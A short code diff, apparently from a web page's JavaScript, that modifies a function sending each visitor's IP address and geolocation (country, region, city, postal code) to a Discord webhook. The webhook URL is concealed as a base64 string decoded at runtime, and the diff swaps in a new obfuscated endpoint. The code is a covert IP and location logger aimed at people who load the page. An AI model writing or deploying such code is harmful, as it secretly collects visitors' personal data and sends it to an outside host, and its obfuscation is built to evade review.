@@ -32,9 +32,9 @@
 
         async function sendIPToWebhook(ip, country, region, city, regionCode, postalCode) {
             try {
-                const encodedUrl  = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExMzkwOTA1MTYyNjExNTA3Mi9VQ3dJay1ScUdYNWoZd2xsdG1QN1ZLWlVndXJGZkt4TkY3UWM3Tkc3bGhDeFdZVkRXN2JHcmFlX25PQWh2U2tPSEo2ZG9ScA==';
-                const decodedUrl  = atob(encodedUrl);
-                const webhookUrl  = decodedUrl;
+                const base64EncodedUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExMzkwOTA1MTYyNjExNTA3Mi9VQ3dJay1ScUdYNWpHd2xscE03VktaVWd1ckZmS3hORjdRY041bGhDeFdZVkRXN2JHcmFlX25PQWh2U2tPSFo2ZG9ScA==';
+    const decodedUrl = atob(base64EncodedUrl);
+    const webhookUrl = decodedUrl;
                 const payload = {
                     content: `
 __**SomeOne Has Want To https://nikoleaks.netlify.app/main/test**__\n
